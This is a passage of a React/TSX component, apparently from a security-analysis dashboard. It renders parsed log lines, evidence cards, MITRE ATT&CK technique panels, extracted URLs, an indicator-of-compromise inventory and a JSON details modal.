                  legend: <span className="text-info">IP</span> <span className="text-accent">port N</span> <span className="text-warning">process</span> <span className="text-primary">keyword</span> <span className="text-success">string</span>
                  <span className="ml-auto ba-text-2xs">click a line to expand</span>
                </div>
              </>
            ) : viewMode === "raw" ? (
              <pre className="overflow-x-auto rounded border border-border/50 bg-background/60 p-3 text-mono ba-text-base leading-relaxed">
                {filteredLines.map(({ ln, i }) => (
                  <div key={i} className="flex gap-3">
                    <span className="select-none text-right ba-text-2xs text-muted-foreground/40" style={{ minWidth: 32 }}>{i + 1}</span>
                    <span>{ln}</span>
                  </div>
                ))}
              </pre>
            ) : (
              <div className="overflow-x-auto rounded border border-border/50 bg-background/60">
                <table className="min-w-full border-collapse text-mono ba-text-sm">
                  <thead>
                    <tr className="border-b border-divider-strong bg-card/50 text-left ba-text-2xs uppercase tracking-widest text-muted-foreground">
                      <th className="px-2 py-1.5 font-normal">#</th>
                      <th className="px-2 py-1.5 font-normal">Time</th>
                      <th className="px-2 py-1.5 font-normal">Source IP</th>
                      <th className="px-2 py-1.5 font-normal">Content</th>
                    </tr>
                  </thead>
                  <tbody>
                    {filteredLines.map(({ ln, i }) => {
                      const ts = ln.match(TS_RE)?.[0] ?? "";
                      const srcIp = ln.match(IPV4_RE)?.[0] ?? "";
                      return (
                        <tr key={i} className="border-b border-divider-soft hover:bg-primary/[0.03]">
                          <td className="px-2 py-1 ba-text-2xs text-muted-foreground/60">{i + 1}</td>
                          <td className="px-2 py-1 text-info/80">{ts}</td>
                          <td className="px-2 py-1 text-info">{srcIp}</td>
                          <td className="px-2 py-1 text-foreground/80 truncate max-w-[600px]">{ln}</td>
                        </tr>
                      );
                    })}
                  </tbody>
                </table>
              </div>
            )}
          </Panel>

          <div className="grid gap-3 grid-cols-[2fr_1fr]">
            <Panel title="Decision" icon={Activity}>
              <KeyFields items={[
                { label: "Classification", value: parsed.classification, tone: "primary" },
                { label: "MITRE lead", value: parsed.mitre, tone: parsed.mitre !== "—" ? "warning" : "default" },
                { label: "Failures", value: parsed.failures, tone: parsed.failures > 0 ? "warning" : "default" },
                { label: "URLs", value: parsed.urls.length, tone: parsed.urls.length ? "warning" : "default" },
                { label: "Events", value: parsed.events.join(", ") || "—" },
              ]} />
            </Panel>

            <Panel title="Field summary" icon={ListFilter} meta="top values per field">
              <div className="space-y-3">
                {fieldSummary.map((f) => (
                  <div key={f.field}>
                    <div className="flex items-center justify-between text-mono ba-text-2xs uppercase tracking-widest text-muted-foreground">
                      <span>{f.field}</span>
                      <span>{f.unique} unique</span>
                    </div>
                    <ul className="mt-1 space-y-1">
                      {f.top.length === 0 ? (
                        <li className="text-mono ba-text-sm text-muted-foreground/60">—</li>
                      ) : f.top.map(({ v, n }) => {
                        const max = f.top[0].n || 1;
                        return (
                          <li key={v} className="space-y-0.5">
                            <div className="flex items-center justify-between gap-2">
                              <button onClick={() => addChip(f.field, v)} className="truncate text-mono ba-text-sm text-foreground/90 hover:text-primary" title={v}>{v}</button>
                              <span className="text-mono ba-text-2xs text-muted-foreground tabular-nums">{n}</span>
                            </div>
                            <div className="h-1 overflow-hidden rounded-sm bg-border/40">
                              <div className="h-full bg-primary/70" style={{ width: `${(n / max) * 100}%` }} />
                            </div>
                          </li>
                        );
                      })}
                    </ul>
                  </div>
                ))}
              </div>
            </Panel>
          </div>

          {/* Evidence cards with bulk selection */}
          <BulkActionBar
            selected={findingSel.selected}
            total={findings.length}
            onSelectAll={() => findingSel.selectAll(findings.length)}
            onClear={findingSel.clear}
            actions={[
              { label: "copy titles", icon: Copy, onClick: (indices) => { const txt = indices.map(i => findings[i].title).join("\n"); copyText(txt); }, tone: "default" },
              { label: "send to case", icon: Send, onClick: (indices) => { localStorage.setItem("beyondlabs.pendingArtifact", JSON.stringify({ type: "findings", content: indices.map(i => findings[i].title).join("\n"), source: "Logs & Alerts" })); }, tone: "primary" },
              { label: "select all", icon: Check, onClick: () => findingSel.selectAll(findings.length), tone: "default" },
            ]}
          />
          <div className="grid gap-3 grid-cols-2">
            {findings.map((f, i) => (
              <div key={i} className="group relative">
                <label className="absolute left-1 top-2 z-10 flex h-5 w-5 cursor-pointer items-center justify-center rounded border border-divider-strong bg-card/80 text-muted-foreground opacity-0 transition-opacity group-hover:opacity-100 has-[:checked]:opacity-100 has-[:checked]:border-primary/60 has-[:checked]:bg-primary/10 has-[:checked]:text-primary">
                  <input
                    type="checkbox"
                    checked={findingSel.selected.has(i)}
                    onChange={() => findingSel.toggle(i, false)}
                    onClick={(e) => { if (e.shiftKey) { e.preventDefault(); findingSel.toggle(i, true); } }}
                    className="h-3 w-3 accent-primary"
                  />
                </label>
                <EvidenceCard severity={f.sev} title={f.title} reason={f.reason} action={f.action} limitation="Analysis based on pattern matching — confirm with full context." />
              </div>
            ))}
          </div>

          {renderEnrichment(enrichResult)}

          {/* MITRE ATT&CK — grouped by tactic */}
          {tacticCoverage.length > 0 && (
            <Panel title="MITRE ATT&CK Tactic Coverage" icon={Crosshair} meta={`${tacticCoverage.length} tactic(s) · ${mitre.length} technique(s)`} collapsible storageKey="ba.panel.logs.mitre-tactics" defaultCollapsed>
              <div className="grid gap-3 grid-cols-3">
                {tacticCoverage.map((t) => (
                  <div key={t.tactic} className="rounded border border-divider-strong bg-card/40 px-3 py-2.5">
                    <div className="flex items-center justify-between gap-2">
                      <span className="text-mono ba-text-sm font-semibold text-foreground/90">{t.tactic}</span>
                      <Chip tone={t.count >= 3 ? "destructive" : t.count >= 2 ? "warning" : "info"}>{t.count}</Chip>
                    </div>
                    <div className="mt-1.5 flex flex-wrap gap-1">
                      {t.techniques.map((tid) => (
                        <span key={tid} className="rounded border border-border/50 bg-background/40 px-1.5 py-0.5 text-mono ba-text-2xs text-muted-foreground">{tid}</span>
                      ))}
                    </div>
                  </div>
                ))}
              </div>
            </Panel>
          )}

          {/* MITRE flat list */}
          {mitre.length > 0 && (
            <Panel title="MITRE ATT&CK Techniques" icon={Crosshair} meta={`${mitre.length} technique${mitre.length === 1 ? "" : "s"}`} collapsible storageKey="ba.panel.logs.mitre-techniques" defaultCollapsed>
              <div className="flex flex-wrap gap-2">
                {mitre.map((m) => (
                  <span key={m.id} className="inline-flex items-center gap-1.5 rounded border border-divider-strong bg-card/40 px-2 py-1 text-mono ba-text-sm text-foreground/85">
                    <Bug className="h-3 w-3 text-destructive" />
                    <span className="font-semibold">{m.id}</span>
                    <span className="text-muted-foreground">:</span>
                    <span>{m.name}</span>
                  </span>
                ))}
              </div>
            </Panel>
          )}

          {/* URLs extracted */}
          {parsed.urls.length > 0 && (
            <Panel title="Extracted URLs" meta={`${parsed.urls.length}`} collapsible storageKey="ba.panel.logs.urls" defaultCollapsed>
              <ul className="space-y-1">
                {parsed.urls.map((u) => (
                  <li key={u} className="border-b border-divider-soft py-1 text-mono ba-text-sm text-foreground/90">{u}</li>
                ))}
              </ul>
            </Panel>
          )}

          <Panel title="IOC Inventory" icon={Database} collapsible storageKey="ba.panel.logs.iocs" defaultCollapsed>
            <IocInventory groups={[
              { kind: "IPv4", items: parsed.ips, tone: "warning" as const },
              { kind: "User", items: parsed.users, tone: "info" as const },
              { kind: "Process", items: parsed.procs, tone: "warning" as const },
              { kind: "Host", items: parsed.hosts },
              { kind: "Signature", items: parsed.sigs },
              { kind: "URL", items: parsed.urls, tone: "warning" as const },
            ]} onSendTo={() => {}} />
          </Panel>

          <SendToRow targets={[
            { label: "SIEM Workspace", to: "/siem", icon: Database },
            { label: "Detection & MITRE", to: "/detection", icon: ShieldAlert },
            { label: "MITRE Coverage", to: "/mitre", icon: ArrowRight },
            { label: "Case Notebook", to: "/case", icon: ArrowRight },
          ]} />
        </div>
        </OutputFilter>
      )}

      {/* Modal */}
      {modal && (
        <div className="fixed inset-0 z-50 grid place-items-center bg-black/60 backdrop-blur-sm" onMouseDown={() => setModal(null)}>
          <div className="max-h-[80vh] w-full max-w-2xl overflow-auto rounded-lg border border-border bg-card p-5 elevation-floating" onMouseDown={(e) => e.stopPropagation()}>
            <div className="flex items-start justify-between gap-3">
              <div>
                <div className="text-mono ba-text-2xs uppercase tracking-widest text-primary">Details</div>
                <h2 className="text-mono text-[14px] font-semibold text-foreground">{modal.title}</h2>
                {modal.subtitle && <p className="text-mono ba-text-sm text-muted-foreground">{modal.subtitle}</p>}
              </div>
              <button onClick={() => setModal(null)} className="text-muted-foreground hover:text-foreground" aria-label="Close"><X className="h-4 w-4" /></button>
            </div>
            <pre className="mt-4 overflow-x-auto rounded border border-divider-strong bg-background/60 p-3 text-mono ba-text-sm leading-relaxed text-foreground/90">{JSON.stringify(modal.data, null, 2)}</pre>
            <div className="mt-3 flex justify-end gap-2">
              <button onClick={() => { copy(JSON.stringify(modal.data, null, 2)); flash("JSON copied"); }} className="rounded border border-border bg-card/60 px-2 py-1 text-mono ba-text-2xs uppercase tracking-widest text-muted-foreground hover:text-foreground">Copy JSON</button>
              <button onClick={() => setModal(null)} className="rounded border border-border bg-card/60 px-2 py-1 text-mono ba-text-2xs uppercase tracking-widest text-muted-foreground hover:text-foreground">Close</button>
            </div>
          </div>
        </div>
      )}
    </>
  );
}

const IPV4_RE = /\b(?:25[0-5]|2[0-4]\d|1?\d?\d)(?:\.(?:25[0-5]|2[0-4]\d|1?\d?\d)){3}\b/;
